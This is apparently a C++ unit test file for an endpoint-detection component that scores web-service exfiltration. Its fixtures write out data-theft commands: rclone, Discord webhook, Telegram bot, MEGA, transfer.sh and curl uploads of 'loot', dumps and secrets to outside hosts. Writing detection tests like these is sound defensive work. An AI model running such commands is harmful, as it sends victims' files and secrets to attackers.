/*
 * web_exfil_detector_tests.cpp - Unit tests for WebExfilDetector
 * (T1567).
 */
#include "web_exfil_detector_tests.h"

#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "web_exfil_detector.h"

namespace {

#define WX_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "web exfil detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

edr::Event ScriptEvent(uint64_t ts100ns, const char* script) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    event.fields[edr::field::kImage] =
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    event.fields[edr::field::kScriptBlockText] = script;
    return event;
}

std::string Score(const edr::Event& event) {
    auto it = event.fields.find(edr::field::kWebExfilScore);
    return it == event.fields.end() ? "" : it->second;
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunWebExfilDetectorTests() {
    std::fprintf(stderr, "[web-exfil] TestDisabled\n");
    {
        edr::WebExfilDetector detector(false, 55, 300, 1024);
        edr::Event event = ProcEvent(
            4000 * kSecond, "C:\\Tools\\rclone.exe",
            "rclone copy C:\\Users\\Public remote:loot");
        detector.Enrich(event);
        WX_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[web-exfil] TestRclone\n");
    {
        edr::WebExfilDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            4001 * kSecond, "C:\\Tools\\rclone.exe",
            "rclone copy C:\\Users\\Public remote:loot");
        detector.Enrich(event);
        WX_CHECK(Score(event) == "90");
        WX_CHECK(event.fields.at(edr::field::kWebExfilVerdict) ==
                 "malicious");
    }
    std::fprintf(stderr, "[web-exfil] TestDiscordWebhook\n");
    {
        edr::WebExfilDetector detector(true, 55, 300, 1024);
        edr::Event event = ScriptEvent(
            4002 * kSecond,
            "Invoke-RestMethod -Uri "
            "https://discord.com/api/webhooks/123/abc "
            "-Method Post -InFile C:\\Temp\\dump.db");
        detector.Enrich(event);
        WX_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[web-exfil] TestTelegramBot\n");
    {
        edr::WebExfilDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            4003 * kSecond, "C:\\Windows\\System32\\curl.exe",
            "curl.exe -F document=@secrets.zip "
            "https://api.telegram.org/bot123:ABC/sendDocument");
        detector.Enrich(event);
        WX_CHECK(Score(event) == "85");
    }
    std::fprintf(stderr, "[web-exfil] TestMegaPut\n");
    {
        edr::WebExfilDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            4004 * kSecond, "C:\\Program Files\\MEGAcmd\\mega-put.bat",
            "mega-put C:\\Users\\Public\\loot.zip /Incoming");
        detector.Enrich(event);
        WX_CHECK(Score(event) == "80");
    }
    std::fprintf(stderr, "[web-exfil] TestTransferSh\n");
    {
        edr::WebExfilDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            4005 * kSecond, "C:\\Windows\\System32\\curl.exe",
            "curl.exe --upload-file dump.7z https://transfer.sh/dump.7z");
        detector.Enrich(event);
        WX_CHECK(Score(event) == "75");
    }
    std::fprintf(stderr, "[web-exfil] TestCurlUpload\n");
    {
        edr::WebExfilDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            4006 * kSecond, "C:\\Windows\\System32\\curl.exe",
            "curl.exe --data-binary @loot.bin https://exfil.test/put");
        detector.Enrich(event);
        WX_CHECK(Score(event) == "70");
        WX_CHECK(event.fields.at(edr::field::kWebExfilVerdict) ==
                 "suspicious");
    }
    std::fprintf(stderr, "[web-exfil] TestCurlDownloadSilent\n");
    {
        edr::WebExfilDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            4007 * kSecond, "C:\\Windows\\System32\\curl.exe",
            "curl.exe -O https://example.com/readme.txt");
        detector.Enrich(event);
        WX_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[web-exfil] TestRcloneVersionSilent\n");
    {
        edr::WebExfilDetector detector(true, 55, 300, 1024);
        edr::Event event = ProcEvent(
            4008 * kSecond, "C:\\Tools\\rclone.exe",
            "rclone version");
        detector.Enrich(event);
        WX_CHECK(Score(event).empty());
    }
    std::fprintf(stderr, "[web-exfil] all passed\n");
}
